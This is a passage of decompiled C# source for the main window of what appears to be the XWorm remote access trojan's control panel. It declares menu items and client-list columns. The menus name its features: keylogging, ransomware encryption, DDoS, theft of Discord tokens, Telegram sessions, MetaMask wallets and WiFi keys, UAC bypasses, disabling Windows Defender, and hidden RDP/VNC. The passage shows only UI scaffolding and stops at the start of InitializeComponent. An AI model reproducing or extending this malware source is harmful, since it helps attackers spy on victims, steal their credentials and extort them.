	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("InstalledProgramsToolStripMenuItem1")]
	private ToolStripMenuItem _InstalledProgramsToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DDosAttackToolStripMenuItem1")]
	private ToolStripMenuItem _DDosAttackToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("VBNetCompilerToolStripMenuItem1")]
	private ToolStripMenuItem _VBNetCompilerToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("LocationManagerToolStripMenuItem")]
	private ToolStripMenuItem _LocationManagerToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PastimeToolStripMenuItem1")]
	private ToolStripMenuItem _PastimeToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClientFolderToolStripMenuItem")]
	private ToolStripMenuItem _ClientFolderToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RestartToolStripMenuItem")]
	private ToolStripMenuItem _RestartToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CloseToolStripMenuItem1")]
	private ToolStripMenuItem _CloseToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UninstallToolStripMenuItem1")]
	private ToolStripMenuItem _UninstallToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UpdateToolStripMenuItem1")]
	private ToolStripMenuItem _UpdateToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("NoteToolStripMenuItem1")]
	private ToolStripMenuItem _NoteToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("MonitorToolStripMenuItem")]
	private ToolStripMenuItem _MonitorToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("WebCamToolStripMenuItem1")]
	private ToolStripMenuItem _WebCamToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("MicrophoneToolStripMenuItem1")]
	private ToolStripMenuItem _MicrophoneToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SystemSoundToolStripMenuItem1")]
	private ToolStripMenuItem _SystemSoundToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("EnableToolStripMenuItem6")]
	private ToolStripMenuItem _EnableToolStripMenuItem6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DisableToolStripMenuItem6")]
	private ToolStripMenuItem _DisableToolStripMenuItem6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("EnableToolStripMenuItem7")]
	private ToolStripMenuItem _EnableToolStripMenuItem7;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DisableToolStripMenuItem7")]
	private ToolStripMenuItem _DisableToolStripMenuItem7;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("EnableToolStripMenuItem8")]
	private ToolStripMenuItem _EnableToolStripMenuItem8;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DisableToolStripMenuItem8")]
	private ToolStripMenuItem _DisableToolStripMenuItem8;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("EnableToolStripMenuItem9")]
	private ToolStripMenuItem _EnableToolStripMenuItem9;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DisableToolStripMenuItem9")]
	private ToolStripMenuItem _DisableToolStripMenuItem9;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("EnableToolStripMenuItem10")]
	private ToolStripMenuItem _EnableToolStripMenuItem10;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DisableToolStripMenuItem10")]
	private ToolStripMenuItem _DisableToolStripMenuItem10;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("EnableToolStripMenuItem11")]
	private ToolStripMenuItem _EnableToolStripMenuItem11;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DisableToolStripMenuItem11")]
	private ToolStripMenuItem _DisableToolStripMenuItem11;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ResetScaleToolStripMenuItem1")]
	private ToolStripMenuItem _ResetScaleToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("InvokeBSODToolStripMenuItem1")]
	private ToolStripMenuItem _InvokeBSODToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DeleteRestoreToolStripMenuItem1")]
	private ToolStripMenuItem _DeleteRestoreToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Net35InstallToolStripMenuItem1")]
	private ToolStripMenuItem _Net35InstallToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ShutdownToolStripMenuItem")]
	private ToolStripMenuItem _ShutdownToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RestartToolStripMenuItem4")]
	private ToolStripMenuItem _RestartToolStripMenuItem4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("LogoffToolStripMenuItem")]
	private ToolStripMenuItem _LogoffToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DiscordTokenToolStripMenuItem")]
	private ToolStripMenuItem _DiscordTokenToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TelegramSessionToolStripMenuItem")]
	private ToolStripMenuItem _TelegramSessionToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ProductKeyToolStripMenuItem1")]
	private ToolStripMenuItem _ProductKeyToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("MetaMaskToolStripMenuItem1")]
	private ToolStripMenuItem _MetaMaskToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FileZillaToolStripMenuItem1")]
	private ToolStripMenuItem _FileZillaToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("WifiKeysToolStripMenuItem1")]
	private ToolStripMenuItem _WifiKeysToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("StartToolStripMenuItem")]
	private ToolStripMenuItem _StartToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("StopToolStripMenuItem")]
	private ToolStripMenuItem _StopToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PerformanceToolStripMenuItem1")]
	private ToolStripMenuItem _PerformanceToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("EditHostsToolStripMenuItem")]
	private ToolStripMenuItem _EditHostsToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OfflineToolStripMenuItem1")]
	private ToolStripMenuItem _OfflineToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OnlineToolStripMenuItem1")]
	private ToolStripMenuItem _OnlineToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClientChatToolStripMenuItem")]
	private ToolStripMenuItem _ClientChatToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FilesSearcherToolStripMenuItem1")]
	private ToolStripMenuItem _FilesSearcherToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CommandsToolStripMenuItem")]
	private ToolStripMenuItem _CommandsToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("MessageBoxToolStripMenuItem")]
	private ToolStripMenuItem _MessageBoxToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RunAsToolStripMenuItem1")]
	private ToolStripMenuItem _RunAsToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CmstpToolStripMenuItem")]
	private ToolStripMenuItem _CmstpToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("EncryptToolStripMenuItem1")]
	private ToolStripMenuItem _EncryptToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DecryptToolStripMenuItem1")]
	private ToolStripMenuItem _DecryptToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ReverseProxyToolStripMenuItem1")]
	private ToolStripMenuItem _ReverseProxyToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("NgrokInstallerToolStripMenuItem")]
	private ToolStripMenuItem _NgrokInstallerToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("HiddenRDPToolStripMenuItem")]
	private ToolStripMenuItem _HiddenRDPToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("HiddenVNCToolStripMenuItem")]
	private ToolStripMenuItem _HiddenVNCToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RunPEToolStripMenuItem")]
	private ToolStripMenuItem _RunPEToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("MemoryToolStripMenuItem2")]
	private ToolStripMenuItem _MemoryToolStripMenuItem2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BotkillerToolStripMenuItem")]
	private ToolStripMenuItem _BotkillerToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("WDKillerToolStripMenuItem")]
	private ToolStripMenuItem _WDKillerToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("WDDisableToolStripMenuItem")]
	private ToolStripMenuItem _WDDisableToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("WDExclusionToolStripMenuItem")]
	private ToolStripMenuItem _WDExclusionToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("WDExclusionToolStripMenuItem1")]
	private ToolStripMenuItem _WDExclusionToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UninstallPluginsToolStripMenuItem")]
	private ToolStripMenuItem _UninstallPluginsToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RunRecoveryToolStripMenuItem")]
	private ToolStripMenuItem _RunRecoveryToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RunRecoveryToolStripMenuItem1")]
	private ToolStripMenuItem _RunRecoveryToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FodhelperToolStripMenuItem")]
	private ToolStripMenuItem _FodhelperToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("HiddenBrowserToolStripMenuItem")]
	private ToolStripMenuItem _HiddenBrowserToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("HiddenAppsToolStripMenuItem")]
	private ToolStripMenuItem _HiddenAppsToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ChromiumToolStripMenuItem")]
	private ToolStripMenuItem _ChromiumToolStripMenuItem;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ChromiumToolStripMenuItem1")]
	private ToolStripMenuItem _ChromiumToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("VoiceChatToolStripMenuItem")]
	private ToolStripMenuItem _VoiceChatToolStripMenuItem;

	public GClass8 gclass8_0;

	private List<GClass9> gclass9s_0;

	public static List<GClass6> gclass6s_0;

	public static bool bool_0;

    [field: AccessedThroughProperty("StatusStrip1")]
    public StatusStrip StatusStrip1
    ;


    [field: AccessedThroughProperty("ToolStripStatusLabel1")]
    public ToolStripStatusLabel ToolStripStatusLabel1
    ;

    public System.Windows.Forms.Timer Timer_Ping
    ;

    public System.Windows.Forms.Timer Timer_Status
    ;

    public NotifyIcon NotifyIcon1
    ;

    [field: AccessedThroughProperty("performanceCounter2")]
    public PerformanceCounter performanceCounter2
    ;

    [field: AccessedThroughProperty("performanceCounter1")]
    public PerformanceCounter performanceCounter1
    ;

    [field: AccessedThroughProperty("ii")]
    public ImageList ii
    ;

    [field: AccessedThroughProperty("Lv2")]
    public GListView0 Lv2
    ;

    [field: AccessedThroughProperty("ColumnHeader16")]
    public ColumnHeader ColumnHeader16
    ;

    [field: AccessedThroughProperty("ColumnHeader17")]
    public ColumnHeader ColumnHeader17
    ;

    public GListView0 Lv1
    ;

    [field: AccessedThroughProperty("Lv3")]
    public GListView0 Lv3
    ;

    [field: AccessedThroughProperty("ColumnHeader12")]
    public ColumnHeader ColumnHeader12
    ;

    [field: AccessedThroughProperty("ColumnHeader13")]
    public ColumnHeader ColumnHeader13
    ;

    public System.Windows.Forms.Timer TimerTask
    ;


    public System.Windows.Forms.Timer ThumbnailCap
    ;

    [field: AccessedThroughProperty("ImageList1")]
    public ImageList ImageList1
    ;

    public ListView Lv4
    ;

    [field: AccessedThroughProperty("_IP")]
    public ColumnHeader _IP
    ;

    [field: AccessedThroughProperty("_Country")]
    public ColumnHeader _Country
    ;

    [field: AccessedThroughProperty("_ID")]
    public ColumnHeader _ID
    ;

    [field: AccessedThroughProperty("_Username")]
    public ColumnHeader _Username
    ;

    [field: AccessedThroughProperty("_Operating")]
    public ColumnHeader _Operating
    ;

    [field: AccessedThroughProperty("_Group")]
    public ColumnHeader _Group
    ;

    [field: AccessedThroughProperty("_Date")]
    public ColumnHeader _Date
      ;

    [field: AccessedThroughProperty("_USB")]
    public ColumnHeader _USB
      ;

    [field: AccessedThroughProperty("_UAC")]
    public ColumnHeader _UAC
      ;

    [field: AccessedThroughProperty("_Cam")]
    public ColumnHeader _Cam
      ;

    [field: AccessedThroughProperty("ImageList2")]
    public ImageList ImageList2
      ;

    [field: AccessedThroughProperty("_CPU")]
    public ColumnHeader _CPU
      ;

    [field: AccessedThroughProperty("_GPU")]
    public ColumnHeader _GPU
  ;

    [field: AccessedThroughProperty("_Ram")]
    public ColumnHeader _Ram
  ;

    [field: AccessedThroughProperty("_Antivirus")]
    public ColumnHeader _Antivirus
      ;
    [field: AccessedThroughProperty("_Note")]
    public ColumnHeader _Note
      ;

    [field: AccessedThroughProperty("_idle")]
    public ColumnHeader _idle
      ;

    [field: AccessedThroughProperty("Guna2Panel6")]
    public Guna2Panel Guna2Panel6
      ;

    public Guna2Button Guna2Button5
    ;

    public Guna2Button Guna2Button4
    ;

    public Guna2Button Guna2Button3
    ;

    public Guna2Button Guna2Button2
    ;

    public Guna2Button Guna2Button1
    ;

    [field: AccessedThroughProperty("Guna2Panel2")]
    public Guna2Panel Guna2Panel2
    ;

    public Guna2TextBox Guna2TextBox1
;

    [field: AccessedThroughProperty("Guna2Panel3")]
    public Guna2Panel Guna2Panel3
    ;

    [field: AccessedThroughProperty("Guna2Panel4")]
    public Guna2Panel Guna2Panel4
    ;

    [field: AccessedThroughProperty("Guna2NotificationPaint1")]
    public Guna2NotificationPaint Guna2NotificationPaint1
    ;

    [field: AccessedThroughProperty("Guna2ContextMenuStrip5")]
    public Guna2ContextMenuStrip Guna2ContextMenuStrip2
    ;

    public ToolStripMenuItem ShowToolStripMenuItem
    ;

    public ToolStripMenuItem RestartToolStripMenuItem1
    ;

    public ToolStripMenuItem ExitToolStripMenuItem
    ;

    [field: AccessedThroughProperty("Guna2ContextMenuStrip4")]
    public Guna2ContextMenuStrip Guna2ContextMenuStrip2_1
    ;

    public ToolStripMenuItem ToolStripMenuItem4
    ;

    public ToolStripMenuItem ToolStripMenuItem6
;

    //[field: AccessedThroughProperty("Guna2ContextMenuStrip2")]
    //public Guna2ContextMenuStrip Guna2ContextMenuStrip2
    //{
    //	get; [MethodImpl(MethodImplOptions.Synchronized)]
    //	set;
    //}

    public ToolStripMenuItem ToolStripMenuItem7
    ;

    [field: AccessedThroughProperty("Guna2HtmlToolTip1")]
    public Guna2HtmlToolTip Guna2HtmlToolTip1
    ;

    public Guna2Button Guna2Button6
;

    public Guna2Button Guna2Button7
    ;

    [field: AccessedThroughProperty("Guna2ContextMenuStrip1")]
    public Guna2ContextMenuStrip Guna2ContextMenuStrip2_2
    ;



    public ToolStripMenuItem KeyloggerToolStripMenuItem
    ;

    [field: AccessedThroughProperty("OpenUrlToolStripMenuItem2")]
    public ToolStripMenuItem OpenUrlToolStripMenuItem2
    ;

    public ToolStripMenuItem VisibleToolStripMenuItem2
    ;

    public ToolStripMenuItem InvisibleToolStripMenuItem2
;

    [field: AccessedThroughProperty("RecoveryToolStripMenuItem1")]
    public ToolStripMenuItem RecoveryToolStripMenuItem1
    ;

    public ToolStripMenuItem MetaMaskToolStripMenuItem2
    ;

    public ToolStripMenuItem DiscordTokenToolStripMenuItem1
    ;

    public ToolStripMenuItem TelegramSessionToolStripMenuItem1
;

    public ToolStripMenuItem FromDiskToolStripMenuItem
    ;

    public ToolStripMenuItem FromLinkToolStripMenuItem
    ;

    public ToolStripMenuItem FromMemoryToolStripMenuItem1
;

    public ToolStripMenuItem UpdateAllClientsToolStripMenuItem1
    ;

    public ToolStripMenuItem RemoveTaskToolStripMenuItem1
    ;

    [field: AccessedThroughProperty("Guna2ContextMenuStrip3")]
    public Guna2ContextMenuStrip Guna2ContextMenuStrip2_3
    ;

    public ToolStripMenuItem InformationToolStripMenuItem1
    ;

    [field: AccessedThroughProperty("RunFileToolStripMenuItem")]
    public ToolStripMenuItem RunFileToolStripMenuItem
    ;

    public ToolStripMenuItem DiskToolStripMenuItem
;

    public ToolStripMenuItem LinkToolStripMenuItem
;


    public ToolStripMenuItem MemoryToolStripMenuItem1
;

    public ToolStripMenuItem RunPEToolStripMenuItem2
    ;


    [field: AccessedThroughProperty("OpenUrlToolStripMenuItem1")]
    public ToolStripMenuItem OpenUrlToolStripMenuItem1
    ;

    public ToolStripMenuItem VisibleToolStripMenuItem1
    ;

    public ToolStripMenuItem InvisibleToolStripMenuItem1
;

    [field: AccessedThroughProperty("OptionsToolStripMenuItem")]
    public ToolStripMenuItem OptionsToolStripMenuItem
    ;

    public ToolStripMenuItem ShellToolStripMenuItem
    ;

    public ToolStripMenuItem FileManagerToolStripMenuItem1
    ;

    [field: AccessedThroughProperty("RecoveryOptionsToolStripMenuItem")]
    public ToolStripMenuItem RecoveryOptionsToolStripMenuItem
    ;

    public ToolStripMenuItem RegistryEditorToolStripMenuItem1
;

    public ToolStripMenuItem TCPConnectionsToolStripMenuItem
    ;

    public ToolStripMenuItem ActiveWindowsToolStripMenuItem1
    ;

    public ToolStripMenuItem StartupManagerToolStripMenuItem1
;

    public ToolStripMenuItem ProcessManagerToolStripMenuItem1
    ;

    public ToolStripMenuItem ServiceManagerToolStripMenuItem1
    ;

    public ToolStripMenuItem ClipboardManagerToolStripMenuItem1
    ;

    public ToolStripMenuItem InstalledProgramsToolStripMenuItem1
    ;

    public ToolStripMenuItem DDosAttackToolStripMenuItem1
    ;

    public ToolStripMenuItem VBNetCompilerToolStripMenuItem1
;

    public ToolStripMenuItem LocationManagerToolStripMenuItem
    ;

    public ToolStripMenuItem PastimeToolStripMenuItem1
    ;


    [field: AccessedThroughProperty("Extra1ToolStripMenuItem")]
    public ToolStripMenuItem Extra1ToolStripMenuItem
    ;
    [field: AccessedThroughProperty("Extra2ToolStripMenuItem1")]
    public ToolStripMenuItem Extra2ToolStripMenuItem1
    ;

    [field: AccessedThroughProperty("ClientToolStripMenuItem1")]
    public ToolStripMenuItem ClientToolStripMenuItem1
    ;

    public ToolStripMenuItem ClientFolderToolStripMenuItem
    ;
    public ToolStripMenuItem RestartToolStripMenuItem
    ;

    public ToolStripMenuItem CloseToolStripMenuItem1
    ;


    public ToolStripMenuItem UninstallToolStripMenuItem1
    ;


    public ToolStripMenuItem UpdateToolStripMenuItem1
    ;

    public ToolStripMenuItem NoteToolStripMenuItem1
    ;


    [field: AccessedThroughProperty("PowerToolStripMenuItem")]
    public ToolStripMenuItem PowerToolStripMenuItem
    ;

    public ToolStripMenuItem MonitorToolStripMenuItem
;

    public ToolStripMenuItem WebCamToolStripMenuItem1
    ;

    public ToolStripMenuItem MicrophoneToolStripMenuItem1
    ;


    public ToolStripMenuItem SystemSoundToolStripMenuItem1
    ;


    [field: AccessedThroughProperty("PowerToolStripMenuItem2")]
    public ToolStripMenuItem PowerToolStripMenuItem2
;

    [field: AccessedThroughProperty("BlankScreenToolStripMenuItem1")]
    public ToolStripMenuItem BlankScreenToolStripMenuItem1
    ;

    public ToolStripMenuItem EnableToolStripMenuItem6
    ;


    public ToolStripMenuItem DisableToolStripMenuItem6
    ;

    [field: AccessedThroughProperty("UACToolStripMenuItem1")]
    public ToolStripMenuItem UACToolStripMenuItem1
    ;

    public ToolStripMenuItem EnableToolStripMenuItem7
    ;

    public ToolStripMenuItem DisableToolStripMenuItem7
    ;

    [field: AccessedThroughProperty("RegeditToolStripMenuItem1")]
    public ToolStripMenuItem RegeditToolStripMenuItem1
    ;

    public ToolStripMenuItem EnableToolStripMenuItem8
    ;

    public ToolStripMenuItem DisableToolStripMenuItem8
    ;

    [field: AccessedThroughProperty("TaskMgrToolStripMenuItem1")]
    public ToolStripMenuItem TaskMgrToolStripMenuItem1
    ;


    public ToolStripMenuItem EnableToolStripMenuItem9
    ;

    public ToolStripMenuItem DisableToolStripMenuItem9
    ;

    [field: AccessedThroughProperty("FirewallToolStripMenuItem1")]
    public ToolStripMenuItem FirewallToolStripMenuItem1
    ;

    public ToolStripMenuItem EnableToolStripMenuItem10
    ;

    public ToolStripMenuItem DisableToolStripMenuItem10
;

    [field: AccessedThroughProperty("UpdateToolStripMenuItem2")]
    public ToolStripMenuItem UpdateToolStripMenuItem2
    ;

    public ToolStripMenuItem EnableToolStripMenuItem11
    ;


    public ToolStripMenuItem DisableToolStripMenuItem11
    ;


    public ToolStripMenuItem ResetScaleToolStripMenuItem1
    ;

    public ToolStripMenuItem InvokeBSODToolStripMenuItem1
    ;

    public ToolStripMenuItem DeleteRestoreToolStripMenuItem1
    ;

    public ToolStripMenuItem Net35InstallToolStripMenuItem1
    ;

    public ToolStripMenuItem ShutdownToolStripMenuItem
    ;

    public ToolStripMenuItem RestartToolStripMenuItem4
;


    public ToolStripMenuItem LogoffToolStripMenuItem
    ;

    public ToolStripMenuItem DiscordTokenToolStripMenuItem
;


    public ToolStripMenuItem TelegramSessionToolStripMenuItem
    ;


    public ToolStripMenuItem ProductKeyToolStripMenuItem1
;

    public ToolStripMenuItem MetaMaskToolStripMenuItem1
    ;

    public ToolStripMenuItem FileZillaToolStripMenuItem1
    ;

    public ToolStripMenuItem WifiKeysToolStripMenuItem1
    ;

    [field: AccessedThroughProperty("ReportWindowToolStripMenuItem1")]
    public ToolStripMenuItem ReportWindowToolStripMenuItem1
    ;


    public ToolStripMenuItem StartToolStripMenuItem
    ;

    public ToolStripMenuItem StopToolStripMenuItem
    ;

    public ToolStripMenuItem PerformanceToolStripMenuItem1
    ;


    public ToolStripMenuItem EditHostsToolStripMenuItem
    ;


    [field: AccessedThroughProperty("KeyLoggerToolStripMenuItem1")]
    public ToolStripMenuItem KeyLoggerToolStripMenuItem1
    ;

    public ToolStripMenuItem OfflineToolStripMenuItem1
    ;

    public ToolStripMenuItem OnlineToolStripMenuItem1
    ;

    public ToolStripMenuItem ClientChatToolStripMenuItem
;

    public ToolStripMenuItem FilesSearcherToolStripMenuItem1
    ;

    public ToolStripMenuItem CommandsToolStripMenuItem
    ;

    public ToolStripMenuItem MessageBoxToolStripMenuItem
    ;

    [field: AccessedThroughProperty("UACBypassToolStripMenuItem1")]
    public ToolStripMenuItem UACBypassToolStripMenuItem1
    ;

    public ToolStripMenuItem RunAsToolStripMenuItem1
    ;

    public ToolStripMenuItem CmstpToolStripMenuItem
    ;

    [field: AccessedThroughProperty("RansomwareToolStripMenuItem1")]
    public ToolStripMenuItem RansomwareToolStripMenuItem1
;

    public ToolStripMenuItem EncryptToolStripMenuItem1
;

    public ToolStripMenuItem DecryptToolStripMenuItem1
    ;


    public ToolStripMenuItem ReverseProxyToolStripMenuItem1
    ;

    public ToolStripMenuItem NgrokInstallerToolStripMenuItem
    ;

    public ToolStripMenuItem HiddenRDPToolStripMenuItem
    ;

    public ToolStripMenuItem HiddenVNCToolStripMenuItem
    ;

    public ToolStripMenuItem RunPEToolStripMenuItem
;

    public ToolStripMenuItem MemoryToolStripMenuItem2
    ;


    public ToolStripMenuItem BotkillerToolStripMenuItem
    ;

    public ToolStripMenuItem WDKillerToolStripMenuItem
;

    public ToolStripMenuItem WDDisableToolStripMenuItem
;


    public ToolStripMenuItem WDExclusionToolStripMenuItem
;

    [field: AccessedThroughProperty("_Ping")]
    public ColumnHeader _Ping
    ;

    [field: AccessedThroughProperty("_ActiveWindow")]
    public ColumnHeader _ActiveWindow
    ;

    [field: AccessedThroughProperty("Guna2Panel1")]
    public Guna2Panel Guna2Panel1
    ;

    [field: AccessedThroughProperty("Guna2Panel5")]
    public Guna2Panel Guna2Panel5
    ;

    public ToolStripMenuItem WDExclusionToolStripMenuItem1
    ;

    public ToolStripMenuItem UninstallPluginsToolStripMenuItem
    ;


    public ToolStripMenuItem RunRecoveryToolStripMenuItem
    ;


    public ToolStripMenuItem RunRecoveryToolStripMenuItem1
;


    public ToolStripMenuItem FodhelperToolStripMenuItem
    ;

    public ToolStripMenuItem HiddenBrowserToolStripMenuItem
;


    public ToolStripMenuItem HiddenAppsToolStripMenuItem
;


    public ToolStripMenuItem ChromiumToolStripMenuItem
    ;

    public ToolStripMenuItem ChromiumToolStripMenuItem1
    ;

	public ToolStripMenuItem VoiceChatToolStripMenuItem;

        

[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.Main));
		this.StatusStrip1 = new System.Windows.Forms.StatusStrip();
		this.ToolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		this.Timer_Ping = new System.Windows.Forms.Timer(this.components);
